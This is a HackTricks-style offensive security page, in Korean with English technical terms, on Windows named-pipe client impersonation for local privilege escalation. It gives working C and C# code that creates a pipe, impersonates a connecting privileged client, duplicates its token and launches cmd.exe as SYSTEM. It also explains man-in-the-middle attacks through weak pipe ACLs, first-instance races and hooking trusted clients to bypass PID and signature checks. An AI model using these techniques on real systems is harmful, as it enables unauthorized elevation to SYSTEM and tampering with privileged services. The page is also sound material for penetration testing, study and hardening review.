# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe Client Impersonation은 named-pipe server thread가 해당 서버에 연결하는 client의 security context를 채택할 수 있도록 하는 local privilege escalation primitive입니다. 실제로 SeImpersonatePrivilege를 사용하여 code를 실행할 수 있는 attacker는 privileged client(예: SYSTEM service)가 attacker가 제어하는 pipe에 연결하도록 유도하고, ImpersonateNamedPipeClient를 호출한 다음, 생성된 token을 primary token으로 duplicate하고, client 권한으로 process를 실행할 수 있습니다(대개 NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

이 페이지에서는 핵심 technique에 중점을 둡니다. SYSTEM이 공격자의 pipe에 연결하도록 유도하는 end-to-end exploit chain은 아래에서 참조하는 Potato family 페이지를 참고하세요.

## TL;DR
- named pipe를 생성합니다: \\.\pipe\<random> 그리고 connection을 기다립니다.
- privileged component가 해당 pipe에 연결하도록 합니다(spooler/DCOM/EFSRPC/etc.).
- pipe에서 최소 하나의 message를 읽은 다음 ImpersonateNamedPipeClient를 호출합니다.
- 현재 thread에서 impersonation token을 열고, DuplicateTokenEx(TokenPrimary)를 사용해 duplicate한 후, CreateProcessWithTokenW/CreateProcessAsUser를 사용하여 SYSTEM process를 생성합니다.<sup>[[2]](#references)</sup>

## Requirements and key APIs
- calling process/thread에 일반적으로 필요한 privileges:
- 연결한 client를 성공적으로 impersonate하고 CreateProcessWithTokenW를 사용하려면 SeImpersonatePrivilege가 필요합니다.
- 또는 SYSTEM을 impersonate한 후 CreateProcessAsUser를 사용할 수 있으며, 이 경우 SeAssignPrimaryTokenPrivilege 및 SeIncreaseQuotaPrivilege가 필요할 수 있습니다( SYSTEM을 impersonate하면 이러한 privilege가 충족됩니다).
- 사용되는 핵심 APIs:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation 전에 최소 하나의 message를 읽어야 함)
- ImpersonateNamedPipeClient 및 RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW 또는 CreateProcessAsUser
- Impersonation level: client가 로컬에서 유용한 작업을 수행하려면 SecurityImpersonation을 허용해야 합니다(많은 로컬 RPC/named-pipe client의 default). pipe를 열 때 client는 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION을 사용하여 이를 낮출 수 있습니다.<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), 먼저 pipe에서 read를 수행했는지, 그리고 client가 impersonation을 Identification level로 제한하지 않았는지 확인하세요.
- process creation에 적합한 primary token을 생성하려면 SecurityImpersonation 및 TokenPrimary와 함께 DuplicateTokenEx를 사용하는 것이 좋습니다.

## .NET 간단한 예제
.NET에서는 NamedPipeServerStream이 RunAsClient를 통해 impersonation을 수행할 수 있습니다. impersonation 상태가 되면 thread token을 duplicate하고 process를 생성합니다.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM을 pipe로 연결하도록 유도/coercion하는 일반적인 trigger
이러한 technique은 privileged service가 사용자의 named pipe에 연결하도록 유도하여 해당 service를 impersonate할 수 있게 합니다:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

자세한 사용법과 compatibility는 다음을 참조하세요:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

pipe를 생성하고 service trigger를 통해 impersonation하여 SYSTEM을 spawn하는 전체 예제가 필요하다면 다음을 참조하세요:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

privileged service와 low-privileged process가 `\\.\pipe\...`를 통해 통신할 때는 해당 pipe를 다른 untrusted IPC boundary와 동일하게 취급해야 합니다. 고전적인 server-side impersonation 외에도 weak pipe ACLs, unsafe creation flags 및 client-side trust decisions가 모두 local privilege escalation primitive가 될 수 있습니다.<sup>[[7]](#references)</sup>

### 먼저 candidate pipe를 열거하기
- PowerShell에서 빠르게 pipe 목록 확인: `Get-ChildItem \\.\pipe\`
- Sysinternals의 `pipelist64.exe`는 instance count와 single-instance pipe를 확인하는 데 유용합니다.
- `SYSTEM`으로 실행되는 service가 사용하는 이름, 특히 helper, updater, launcher 및 UI broker에 우선순위를 둡니다.

### permissive DACLs 및 추가 pipe instance를 통한 MITM
- privileged server와 통신할 수 있는 모든 process는 이미 해당 protocol을 fuzz하고 privileged verb를 탐색할 수 있습니다.<sup>[[7]](#references)</sup>
- 더 흥미로운 경우는 DACL이 pipe object에 `FILE_GENERIC_WRITE`/`GENERIC_WRITE`를 허용하는 경우입니다. named pipe에서는 여기에 `FILE_CREATE_PIPE_INSTANCE`가 암시적으로 포함됩니다 (`FILE_APPEND_DATA`도 동일한 bit를 공유). 따라서 attacker는 동일한 이름으로 다른 server instance를 생성할 수 있습니다.
- instance는 FIFO 순서로 매칭되므로 attacker가 생성한 instance와 legitimate instance가 서로 섞일 수 있습니다. `CreateNamedPipe`로 rogue instance를 생성한 다음 `CreateFile`로 동일한 pipe name을 열고, 실제 client가 rogue server instance에 연결될 때까지 기다립니다.
- 그 결과 original server process를 소유하지 않고도 privileged IPC를 observe, modify, relay 또는 desynchronize할 수 있습니다.

### pipe security descriptor의 First-instance race
- `lpSecurityAttributes`는 pipe name의 첫 번째 instance가 생성될 때만 DACL을 정의합니다.<sup>[[4]](#references)[[7]](#references)</sup>
- privileged service가 늦게 시작되고 `FILE_FLAG_FIRST_PIPE_INSTANCE`를 사용하지 않는 경우, attacker는 permissive DACL로 pipe name을 미리 생성한 다음 service가 attacker가 선택한 security context에서 이후 instance를 생성하도록 할 수 있습니다.
- 이는 service startup을 race condition으로 바꿉니다. 첫 번째 instance를 선점한 다음 weakened ACL을 사용하여 이후 client를 연결하거나 MITM합니다.
- defenders를 위한 mitigation이자 attackers의 주요 review point는 `CreateNamedPipe(..., dwOpenMode, ...)`에 `FILE_FLAG_FIRST_PIPE_INSTANCE`가 포함되어 있는지 확인하는 것입니다. 없다면 service가 시작되기 전에 pre-creation을 테스트하세요.

### PID/signature checks는 hardening이지 boundary가 아님
- 일부 product는 `GetNamedPipeClientProcessId`, process image path 또는 연결하는 client의 Authenticode signer를 확인하여 access를 제한하려고 합니다.<sup>[[7]](#references)</sup>
- 이는 legitimate client에 inject하기 전까지만 도움이 됩니다. trusted process 내부에 들어가면 server가 기대하는 정확한 PID/image/signature context를 그대로 상속합니다.
- split desktop app의 경우 `SYSTEM` service를 직접 공격하는 것보다 low-privileged UI/helper process에 instrumenting하는 편이 더 쉬운 경우가 많습니다.

### client의 I/O model에 맞춰 hook하기
- Synchronous I/O: syscall이 buffer를 consume하기 전에 `NtWriteFile`을 intercept하고, `NtReadFile`이 return한 후 이를 inspect/patch합니다.<sup>[[7]](#references)</sup>
- Overlapped I/O: `NtReadFile`에서 확인한 `OVERLAPPED`/`IoStatusBlock`을 저장한 다음 `GetOverlappedResult` 또는 관련 wait가 완료된 후 buffer를 inspect합니다.
- Completion ports: `GetQueuedCompletionStatus`는 `NtRemoveIoCompletion`에 도달합니다. 반환된 `ApcContext`는 original read에 사용된 `OVERLAPPED`로 연결되므로, 이제 값이 채워진 buffer를 찾기 위한 적절한 pivot입니다.
- Completion routines (`ReadFileEx`): completion callback은 APC로 전달됩니다. 반환된 data를 tamper하거나 synthetic reply를 inject하려면 실제 completion routine을 hook하고, custom injection에는 routine의 예상 인수 3개를 재구성하는 one-argument `QueueUserAPC` dispatcher를 사용합니다.<sup>[[5]](#references)[[7]](#references)</sup>

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)은 injected helper DLL을 통해 named-pipe traffic을 proxy하고, editing/replay를 위한 Burp와 유사한 workflow를 제공합니다.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)는 Frida 기반 approach를 사용하며, `NtReadFile`/`NtWriteFile`과 위의 async/completion pivot을 hooking한 뒤 traffic을 WebSocket-backed editing workflow로 forwarding하는 데 중점을 둡니다.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### 운영 시 고려 사항
- Named pipe는 latency가 낮으므로, buffer를 편집하는 동안 긴 일시 중지가 발생하면 취약한 service에서 deadlock이 발생할 수 있습니다.<sup>[[7]](#references)</sup>
- Overlapped/completion-port/APC-driven client에는 단순한 `ReadFile`/`WriteFile` detour와는 다른 hooks가 필요합니다.
- 신뢰된 client에 대한 injection은 탐지 가능성이 높으므로, 일반적으로 exploit 개발, protocol reversing 또는 로컬 lab fuzzing 용도로 제한하는 것이 좋습니다.

## Troubleshooting 및 주의 사항
- `ImpersonateNamedPipeClient`를 호출하기 전에 pipe에서 최소 하나의 message를 읽어야 합니다. 그렇지 않으면 ERROR_CANNOT_IMPERSONATE (1368)가 발생합니다.<sup>[[1]](#references)</sup>
- client가 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION로 연결하면 server는 완전한 impersonation을 수행할 수 없습니다. `GetTokenInformation(TokenImpersonationLevel)`을 통해 token의 impersonation level을 확인하세요.<sup>[[3]](#references)</sup>
- `CreateProcessWithTokenW`를 호출하려면 caller에 SeImpersonatePrivilege가 필요합니다. ERROR_PRIVILEGE_NOT_HELD (1314)와 함께 실패하면, 이미 SYSTEM을 impersonate한 후 `CreateProcessAsUser`를 사용하세요.
- pipe를 harden하는 경우 대상 service가 연결할 수 있도록 pipe의 security descriptor가 허용하는지 확인하세요. 기본적으로 `\\.\pipe` 아래의 pipe는 server의 DACL에 따라 접근할 수 있습니다.<sup>[[3]](#references)</sup>

## References

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
